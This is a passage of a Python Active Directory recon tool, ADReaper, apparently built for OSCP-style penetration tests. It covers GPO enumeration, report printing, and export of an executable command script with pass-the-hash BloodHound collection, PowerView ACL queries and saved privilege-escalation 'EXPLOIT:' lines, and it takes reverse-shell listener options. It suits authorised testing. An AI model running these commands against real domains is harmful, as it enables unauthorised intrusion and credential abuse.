            name = str(getattr(e, "displayName", "?"))
            path = str(getattr(e, "gPCFileSysPath", ""))
            gpos.append({"name": name, "path": path})

        with results_lock:
            results["writable_gpos"] = gpos

        add_finding("INFO", f"GPOs found ({len(gpos)})",
            "Check for GPOs writable by low-privileged users.",
            [f"# PowerView — GPOs writable by Domain Users:",
             f"$sid = (Get-DomainGroup 'Domain Users').objectsid",
             f"Get-DomainGPO | Get-ObjectAcl | ? {{$_.SecurityIdentifier -eq $sid}}",
             f"# Group3r — deep GPO misconfiguration audit:",
             f"Group3r.exe -f group3r_output.log",
             f"# GPResult on target:",
             f"gpresult /r",
             f"gpresult /h gpo_report.html"])

    except Exception as ex:
        console.print(f"[red]  [!] GPO enum error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# BLOODHOUND REMINDER
# ═════════════════════════════════════════════════════════════════════════════

def module_bloodhound_reminder(args):
    add_finding("INFO", "BloodHound — run for complete attack path mapping",
        "BloodHound visualises all AD attack paths including ACL chains, trust abuses, and delegation.",
        [f"bloodhound-python -u '{args.user}' -p '{args.password or '<pass>'}' "
         f"-d {args.domain} -dc {args.dc_ip} --zip -c All",
         f"# For Pass-the-Hash:",
         f"bloodhound-python -u '{args.user}' --hashes ':{args.hash or '<NTHASH>'}' "
         f"-d {args.domain} -dc {args.dc_ip} --zip -c All",
         f"# Start Neo4j + BloodHound GUI:",
         f"sudo neo4j start && bloodhound"])


# ═════════════════════════════════════════════════════════════════════════════
# OUTPUT — RICH CONSOLE REPORT
# ═════════════════════════════════════════════════════════════════════════════

SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_STYLE = {
    "CRITICAL": "bold red",
    "HIGH": "bold yellow",
    "MEDIUM": "cyan",
    "LOW": "dim",
    "INFO": "green",
}

def print_banner(args):
    console.print(Panel(
        Text.assemble(
            (" ▄▄  ▄▄▄  ▄▄▄  ▄▄▄  ▄▄  ▄▄▄  ▄▄▄  ▄▄▄  ▄▄▄  ▄▄▄ \n", "bold red"),
            ("│AD │ R  │ E  │ A  │ P  │ E  │ R  │    │ v1 │.0  │\n", "bold red"),
            (" ▀▀  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀ \n", "bold red"),
            ("\n", ""),
            ("  AD + Windows PrivEsc Recon  |  OSCP Compliant  |  No Exploitation\n", "bold white"),
            (f"\n  Target DC : {args.dc_ip}\n", "dim"),
            (f"  Domain    : {args.domain}\n", "dim"),
            (f"  User      : {args.user or 'anonymous'}\n", "dim"),
            (f"  Started   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n", "dim"),
        ),
        title="[bold red]ADReaper[/bold red]",
        border_style="red",
    ))

def print_domain_summary():
    d = results.get("domain", {})
    if not d:
        return
    t = Table(title="Domain Summary", box=richbox.SIMPLE, show_header=False, border_style="dim")
    t.add_column("Key", style="cyan", width=28)
    t.add_column("Value", style="white")
    rows = [
        ("Domain Name",          str(d.get("name", "?"))),
        ("Min Password Length",  str(d.get("min_pwd_length", "?"))),
        ("Lockout Threshold",    str(d.get("lockout_threshold", "?"))),
        ("Password History",     str(d.get("pwd_history", "?"))),
        ("Machine Account Quota",str(d.get("machine_account_quota", "?"))),
    ]
    for k, v in rows:
        t.add_row(k, v)
    dcs = d.get("domain_controllers", [])
    if dcs:
        t.add_row("Domain Controllers", "\n".join(f"{dc['hostname']} ({dc['os']})" for dc in dcs))
    console.print(t)

def print_findings():
    findings = sorted(results["findings"], key=lambda f: SEV_ORDER.get(f["severity"], 99))

    console.rule("[bold red]═  FINDINGS  ═[/bold red]")
    console.print()

    for f in findings:
        sev   = f["severity"]
        style = SEV_STYLE.get(sev, "white")
        badge = f"[{style}][{sev}][/{style}]"
        console.print(f"  {badge}  [bold white]{f['title']}[/bold white]")
        if f["detail"]:
            for line in f["detail"].split("\n"):
                console.print(f"         [dim]{line}[/dim]")
        console.print()

def print_commands():
    console.rule("[bold magenta]═  COMMANDS TO RUN  ═[/bold magenta]")
    console.print()
    findings = sorted(results["findings"], key=lambda f: SEV_ORDER.get(f["severity"], 99))
    for f in findings:
        if not f["commands"]:
            continue
        sev   = f["severity"]
        style = SEV_STYLE.get(sev, "white")
        console.print(f"  [{style}]# {f['title']}[/{style}]")
        for cmd in f["commands"]:
            if cmd.startswith("#"):
                console.print(f"  [dim]{cmd}[/dim]")
            else:
                console.print(f"  [bold magenta]$[/bold magenta] [white]{cmd}[/white]")
        console.print()

def print_privesc_section():
    privesc = results.get("privesc_checks", {})
    if not privesc:
        return

    console.rule("[bold yellow]═  WINDOWS PRIVESC PATHS  ═[/bold yellow]")
    console.print("  [dim]Run these checks on each compromised Windows host.[/dim]")
    console.print()

    order = ["seimpersonate", "sebdebugprivilege", "sebackupprivilege", "setakeownership",
             "always_install_elevated", "unquoted_service_paths", "weak_service_permissions",
             "scheduled_tasks", "token_impersonation", "dll_hijacking",
             "credential_hunting", "kernel_exploits", "winpeas"]

    for key in order:
        if key not in privesc:
            continue
        check = privesc[key]
        sev   = check["severity"]
        style = SEV_STYLE.get(sev, "white")
        console.print(f"  [{style}][{sev}][/{style}]  [bold white]{check['title']}[/bold white]")
        console.print(f"         [dim]{check['detail']}[/dim]")

        if check["check_cmds"]:
            console.print("         [cyan]  Check:[/cyan]")
            for c in check["check_cmds"]:
                pfx = "  " if c.startswith("#") else "  [bold magenta]$[/bold magenta] "
                console.print(f"         {pfx}[white]{c}[/white]")

        if check["exploit_cmds"]:
            console.print("         [yellow]  If vulnerable:[/yellow]")
            for c in check["exploit_cmds"]:
                pfx = "  " if c.startswith("#") else "  [bold magenta]$[/bold magenta] "
                console.print(f"         {pfx}[white]{c}[/white]")
        console.print()

def print_stats():
    console.rule("[bold white]═  STATISTICS  ═[/bold white]")
    t = Table(box=richbox.SIMPLE, show_header=False)
    t.add_column("Metric", style="cyan", width=34)
    t.add_column("Count", style="bold white")

    counts = [
        ("Total users enumerated",       len(results["users"])),
        ("Total computers enumerated",   len(results["computers"])),
        ("Total groups enumerated",      len(results["groups"])),
        ("Kerberoastable accounts",      len(results["spn_users"])),
        ("ASREPRoastable accounts",      len(results["asrep_users"])),
        ("Unconstrained deleg. users",   len(results["unconstrained_users"])),
        ("Unconstrained deleg. comps",   len(results["unconstrained_computers"])),
        ("Constrained delegation",       len(results["constrained"])),
        ("Passwords in descriptions",    len(results["password_in_desc"])),
        ("Stale computers (>90 days)",   len(results["stale_computers"])),
        ("Domain trusts",                len(results["trusts"])),
        ("GPOs",                         len(results["writable_gpos"])),
    ]
    for label, count in counts:
        style = "bold red" if count > 0 and label not in ("Total users enumerated",
                                                           "Total computers enumerated",
                                                           "Total groups enumerated",
                                                           "Domain trusts", "GPOs") else "white"
        t.add_row(label, f"[{style}]{count}[/{style}]")

    sev_counts = {}
    for f in results["findings"]:
        sev_counts[f["severity"]] = sev_counts.get(f["severity"], 0) + 1
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        c = sev_counts.get(sev, 0)
        style = SEV_STYLE.get(sev, "white")
        t.add_row(f"Findings — {sev}", f"[{style}]{c}[/{style}]")

    console.print(t)


# ═════════════════════════════════════════════════════════════════════════════
# OUTPUT — FILE EXPORT
# ═════════════════════════════════════════════════════════════════════════════

def save_json(outdir):
    path = os.path.join(outdir, "adreaper_results.json")
    with open(path, "w") as f:
        json.dump(results, f, indent=2, default=str)
    console.print(f"  [green]JSON saved:[/green] {path}")

def save_markdown(outdir, args):
    path = os.path.join(outdir, "adreaper_report.md")
    lines = []
    lines.append(f"# ADReaper Report")
    lines.append(f"**Target:** {args.dc_ip}  |  **Domain:** {args.domain}  |  **Date:** {datetime.now().strftime('%Y-%m-%d %H:%M')}\n")

    # Domain
    d = results.get("domain", {})
    if d:
        lines.append("## Domain Summary")
        lines.append(f"| Key | Value |")
        lines.append(f"|-----|-------|")
        for k, v in [("Domain", d.get("name")), ("Min Pwd Length", d.get("min_pwd_length")),
                     ("Lockout Threshold", d.get("lockout_threshold")), ("MAQ", d.get("machine_account_quota"))]:
            lines.append(f"| {k} | {v} |")
        lines.append("")

    # Findings
    lines.append("## Findings")
    findings = sorted(results["findings"], key=lambda f: SEV_ORDER.get(f["severity"], 99))
    for f in findings:
        lines.append(f"\n### [{f['severity']}] {f['title']}")
        if f["detail"]:
            lines.append(f"{f['detail']}\n")
        if f["commands"]:
            lines.append("**Commands:**")
            lines.append("```bash")
            for c in f["commands"]:
                lines.append(c)
            lines.append("```")

    # PrivEsc
    lines.append("\n## Windows Privilege Escalation Paths")
    privesc = results.get("privesc_checks", {})
    for key, check in privesc.items():
        lines.append(f"\n### [{check['severity']}] {check['title']}")
        lines.append(f"{check['detail']}\n")
        if check["check_cmds"]:
            lines.append("**Check:**")
            lines.append("```powershell")
            for c in check["check_cmds"]:
                lines.append(c)
            lines.append("```")
        if check["exploit_cmds"]:
            lines.append("**If vulnerable:**")
            lines.append("```powershell")
            for c in check["exploit_cmds"]:
                lines.append(c)
            lines.append("```")

    with open(path, "w") as f:
        f.write("\n".join(lines))
    console.print(f"  [green]Markdown saved:[/green] {path}")

def save_commands(outdir, args):
    path = os.path.join(outdir, "adreaper_commands.sh")
    lines = ["#!/bin/bash", f"# ADReaper commands — {args.domain} — {datetime.now().strftime('%Y-%m-%d %H:%M')}", ""]
    findings = sorted(results["findings"], key=lambda f: SEV_ORDER.get(f["severity"], 99))
    for f in findings:
        if not f["commands"]:
            continue
        lines.append(f"# [{f['severity']}] {f['title']}")
        for cmd in f["commands"]:
            lines.append(cmd)
        lines.append("")

    privesc = results.get("privesc_checks", {})
    lines.append("# ═══ WINDOWS PRIVESC COMMANDS ═══")
    for key, check in privesc.items():
        lines.append(f"# [{check['severity']}] {check['title']}")
        for c in check.get("check_cmds", []):
            lines.append(f"# CHECK: {c}")
        for c in check.get("exploit_cmds", []):
            lines.append(f"# EXPLOIT: {c}")
        lines.append("")

    with open(path, "w") as f:
        f.write("\n".join(lines))
    os.chmod(path, 0o755)
    console.print(f"  [green]Commands saved:[/green] {path}")


# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description="ADReaper — AD + Windows PrivEsc Recon (OSCP-compliant)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 adreaper.py -d corp.local -dc 10.10.10.10 -u john -p Password123
  python3 adreaper.py -d corp.local -dc 10.10.10.10 -u john --hash aad3b435b51404eeaad3b435b51404ee:abcdef1234567890
  python3 adreaper.py -d corp.local -dc 10.10.10.10 -u john -p Password123 --target-host 10.10.10.20 --lhost 10.10.14.5
  python3 adreaper.py -d corp.local -dc 10.10.10.10 (anonymous — limited info)
        """,
    )
    p.add_argument("-d",  "--domain",      required=True,  help="Domain name (e.g. corp.local)")
    p.add_argument("-dc", "--dc-ip",       required=True,  help="Domain Controller IP")
    p.add_argument("-u",  "--user",        default=None,   help="Username")
    p.add_argument("-p",  "--password",    default=None,   help="Password")
    p.add_argument("--hash",              default=None,   help="NTLM hash (LM:NT or :NT)")
    p.add_argument("--target-host",       default=None,   help="Compromised Windows host IP for PrivEsc commands")
    p.add_argument("--lhost",             default=None,   help="Your Kali IP (for reverse shell commands)")
    p.add_argument("--lport",             default="4444", help="Your listener port (default: 4444)")
    p.add_argument("-o",  "--output",     default="./adreaper_out", help="Output directory (default: ./adreaper_out)")
    p.add_argument("--no-privesc",        action="store_true", help="Skip Windows PrivEsc section")
    p.add_argument("--threads",           type=int, default=5, help="Thread count for parallel modules (default: 5)")
    return p.parse_args()


def run_ldap_modules(args):
    conn = get_ldap_connection(args)
    if not conn:
        console.print("[red][!] Could not establish LDAP connection. Check credentials and DC IP.[/red]")
        return

    base_dn = get_base_dn(args.domain)
    console.print(f"\n[green][+] LDAP connected as: {conn.extend.standard.who_am_i() or 'anonymous'}[/green]")
    console.print(f"[green][+] Base DN: {base_dn}[/green]\n")

    console.rule("[bold cyan]Running Enumeration Modules[/bold cyan]")

    tasks = [
        ("Domain baseline",      lambda: module_domain_info(conn, base_dn, args)),
        ("Users",                lambda: module_users(conn, base_dn, args)),
        ("Computers",            lambda: module_computers(conn, base_dn, args)),
        ("Groups",               lambda: module_groups(conn, base_dn, args)),
        ("Delegation",           lambda: module_delegation(conn, base_dn, args)),
        ("Domain trusts",        lambda: module_trusts(conn, base_dn, args)),
        ("GPOs",                 lambda: module_gpo(conn, base_dn, args)),
        ("ACLs",                 lambda: module_acls(conn, base_dn, args)),
    ]

    # Run sequentially to avoid LDAP connection issues with threading
    for name, fn in tasks:
        try:
            fn()
        except Exception as ex:
            console.print(f"[red]  [!] Module '{name}' failed: {ex}[/red]")

    conn.unbind()


def main():
    args = parse_args()
    os.makedirs(args.output, exist_ok=True)

    with results_lock:
        results["meta"] = {
            "domain": args.domain,
            "dc_ip": args.dc_ip,
            "user": args.user,
            "target_host": args.target_host,
            "started": datetime.now().isoformat(),
        }

    print_banner(args)

    # LDAP modules
    run_ldap_modules(args)

    # Non-LDAP modules
    module_smb(args)
    module_kerberos_tools(args)
    module_bloodhound_reminder(args)

    if not args.no_privesc:
        module_windows_privesc(args)

    # ── PRINT REPORT ──────────────────────────────────────────────────────
    console.print("\n")
    console.rule("[bold red]═  ADREAPER REPORT  ═[/bold red]")
    console.print()

    print_domain_summary()
    print_stats()
    print_findings()
    print_commands()

    if not args.no_privesc:
        print_privesc_section()

    # ── SAVE FILES ────────────────────────────────────────────────────────
    console.rule("[bold white]═  SAVING OUTPUT  ═[/bold white]")
    save_json(args.output)
    save_markdown(args.output, args)
    save_commands(args.output, args)

    console.print(f"\n[bold green][✓] ADReaper complete. Output: {args.output}/[/bold green]\n")


if __name__ == "__main__":
    main()
